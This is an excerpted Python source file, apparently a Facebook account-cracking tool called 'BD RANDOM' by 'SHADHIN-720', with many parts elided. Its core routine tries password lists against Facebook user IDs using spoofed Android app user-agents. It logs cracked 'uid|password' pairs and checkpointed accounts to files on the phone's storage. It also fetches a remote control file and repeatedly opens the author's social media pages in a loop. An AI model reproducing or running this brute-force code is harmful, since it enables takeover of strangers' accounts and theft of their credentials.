...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSHADHIN-720\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSHADHIN-720\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mSHADHIN-720\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/SHADHIN')
...
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/SHADHIN/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
        ...
        for j in range(1000):
            time.sleep(0.5)
            os.system('xdg-open https://github.com/SHADHIN-720')
...
os.system('xdg-open https://www.facebook.com/54DH1N.420.NAMAZ.PAGOL.TAH.UFF')
def logo():
    os.system('clear')
    print(f"""                   {green}┏━━━━━━━━━━━━━━━━━━━┓{green}
                   {green}┃{white}{faltu}ASSALAMUYALAIKUM {pvt}{green}┃
{green}╔━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━┳━━━━━┻━━━━━━━━━━━━━━━━━━━╗
{green}┃{green}╔═╗╦ ╦╔═╗╔╦╗╦ ╦╦╔╗╔  {green}╔═╗╦ ╦╔╦╗╔═╗╔╦╗ ┃{purple}CEO {yelloww}: {yellow}SHADHIN AHMED{green}┃
{green}┃{white}╚═╗╠═╣╠═╣ ║║╠═╣║║║║  {white}╠═╣╠═╣║║║║╣  ║║ ┃{purple}FACEBOOK {yelloww}: {green}MD SHADHIN ISLAM{green}┃
{green}┃{green}╚═╝╩ ╩╩ ╩═╩╝╩ ╩╩╝╚╝  ╩ {green}╩╩ ╩╩ ╩╚═╝═╩╝  ┃{purple}GIT {yelloww}: {cyan}SHADHIN AHMED{green}┃
{green}┣━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┻━━━━━━┳━━━━━━━━━━━━━━━━━━┫
{green}┃ {green}TOOL : {yelloww}BD RANDOM {green}{green}┃ {green}WP {yelloww}: {blue}+8801773452898{green}┃  {yelloww}VERSION {green}: {rad}0.19  {green}┃
{green}╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━╝""")
...
def shadhin():
    ...
    _____shadhin_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if _____shadhin_____ in ['A','a','01','1']:
        os.system('xdg-open https://www.facebook.com/54DH1N.420.NAMAZ.PAGOL.TAH.UFF')
        ___uids___()
    elif _____shadhin_____ in ['B','b','02','2']:
        os.system('xdg-open https://www.facebook.com/54DH1N.420.NAMAZ.PAGOL.TAH.UFF')
    elif _____shadhin_____ in ['C','c','03','3']:
        os.system('xdg-open ')
    elif _____shadhin_____ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');shadhin()
...
def ___random___(ids,passlist):
    try:
        global oks,loop
        sys.stdout.write(f'\r\r{rad}[{green}𝐕𝐀𝐈𝐋𝐄𝐍𝐂{rad}]{white}<>{rad}[{yelloww}%s{rad}]{white}<>{rad}[{green}𝐒𝐇𝐀𝐃𝐇𝐈𝐍:%s{rad}]'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
         ...
         #   ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
           ...
           # ___MSUA___ = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
            ...
            if 'session_key' in q:
                ...
                if 'Photoshop' in res:
                    print('\r\r\033[1;31m[\033[1;32m𝐒𝐇𝐀𝐃𝐇𝐈𝐍\033[1;31m]\033[1;32m '+uid+' | '+pas+'\033[1;97m')
                    open('/sdcard/𝐒𝐇𝐀𝐃𝐇𝐈𝐍-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
                else:pass
            elif 'www.facebook.com' in q['error_msg']:
                print(f'\r\r\x1b[38;5;208m[DIED] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/𝐒𝐇𝐀𝐃𝐇𝐈𝐍-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
